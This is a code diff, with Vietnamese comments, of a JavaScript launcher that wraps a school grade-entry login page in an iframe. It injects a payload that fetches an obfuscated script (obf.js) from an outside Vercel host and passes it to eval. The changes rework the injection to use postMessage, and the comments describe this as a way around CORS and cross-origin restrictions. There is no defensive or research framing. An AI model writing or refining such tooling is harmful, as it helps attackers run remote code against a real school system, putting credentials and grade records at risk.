@@ -1,13 +1,12 @@
 // ============================================================
-// NT4NH2 // LAUNCHER SCRIPT (DATA URI INJECTION BYPASS)
-// Lách CORS bằng kỹ thuật document.write vào iframe trắng
+// NT4NH2 // LAUNCHER SCRIPT (SRCDOC + POSTMESSAGE BYPASS)
+// Khắc phục triệt để DOMException khi nhúng iframe Cross-Origin
 // ============================================================
 
 const DEFAULT_CONFIG = {
   targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
-  // Đã sửa lại đường dẫn fetch có https://
   payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
-  delay: 1500,
+  delay: 2000,
   title: "Launcher Tool",
   bg: "#0d1117",
   text: "#c9d1d9"
@@ -63,16 +62,16 @@ function setStatus(msg) {
   statusEl.textContent = "Trạng thái: " + msg;
 }
 
-// Hàm khởi tạo Inject
+// Kỹ thuật Inject không dùng document.write trực tiếp
 function launchTool() {
   popupShown = false;
-  setStatus("Đang khởi tạo môi trường Inject...");
+  setStatus("Đang khởi tạo môi trường...");
 
   if (currentIframe) {
     currentIframe.remove();
   }
 
-  // Tạo iframe full màn hình
+  // Tạo iframe
   currentIframe = document.createElement("iframe");
   currentIframe.style.width = "100vw";
   currentIframe.style.height = "100vh";
@@ -85,31 +84,58 @@ function launchTool() {
   
   document.body.appendChild(currentIframe);
 
-  // Kỹ thuật tạo iframe cùng domain (about:blank)
-  const iframeDoc = currentIframe.contentWindow.document;
-  iframeDoc.open();
-  iframeDoc.write(`
-    <!DOCTYPE html>
-    <html>
-      <head>
-        <script>
-          // Chèn payload vào đây để nó chạy ngay khi trang đích load
-          window.onload = function() {
-            setTimeout(function() {
-              ${CONFIG.payload}
-            }, 500);
-          };
-        </script>
-      </head>
-      <body style="margin:0; padding:0;">
-        <!-- Nhúng trang đích vào đây -->
-        <iframe src="${CONFIG.targetUrl}" style="width:100%; height:100vh; border:none;"></iframe>
-      </body>
-    </html>
-  `);
-  iframeDoc.close();
+  // Chờ iframe render xong môi trường trắng (same-origin)
+  currentIframe.onload = () => {
+    try {
+      // Lấy document của iframe (lúc này là about:blank, cùng origin)
+      const iframeDoc = currentIframe.contentWindow.document;
+      
+      // Tạo cấu trúc HTML mới
+      iframeDoc.open();
+      iframeDoc.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <script>
+            // Lắng nghe tín hiệu từ trang mẹ để chạy payload
+            window.addEventListener("message", function(e) {
+              if (e.data === "RUN_PAYLOAD") {
+                try {
+                  ${CONFIG.payload}
+                } catch (err) {
+                  console.error("Payload Error:", err);
+                }
+              }
+            });
+          </script>
+        </head>
+        <body style="margin:0; padding:0; overflow:hidden;">
+          <!-- Tải trang đích -->
+          <iframe src="${CONFIG.targetUrl}" style="width:100%; height:100vh; border:none;"></iframe>
+        </body>
+        </html>
+      `);
+      iframeDoc.close();
 
-  setStatus("Đã tiêm payload. Đang giám sát...");
+      // Đợi trang con load xong rồi gửi tín hiệu
+      setTimeout(() => {
+        if (currentIframe && currentIframe.contentWindow) {
+          // Gửi tín hiệu kích hoạt payload
+          currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
+          setStatus("Đã kích hoạt Payload. Đang giám sát...");
+        }
+      }, CONFIG.delay);
+
+    } catch (e) {
+      console.error("Lỗi Inject DOM:", e);
+      setStatus("Lỗi: Không thể ghi vào iframe.");
+      onToolClosed();
+    }
+  };
+
+  // Gán src cho iframe để kích hoạt onload
+  currentIframe.src = "about:blank";
+  
   startWatch();
 }
 
@@ -154,7 +180,7 @@ btnSettingWeb.addEventListener("click", () => {
 btnSaveTool.addEventListener("click", () => {
   CONFIG.targetUrl = inpTargetUrl.value.trim();
   CONFIG.payload   = inpPayload.value.trim();
-  CONFIG.delay     = parseInt(inpDelay.value) || 1500;
+  CONFIG.delay     = parseInt(inpDelay.value) || 2000;
   saveConfig(CONFIG);
   settingTool.classList.add("hidden");
   setStatus("Đã lưu setting tool.");
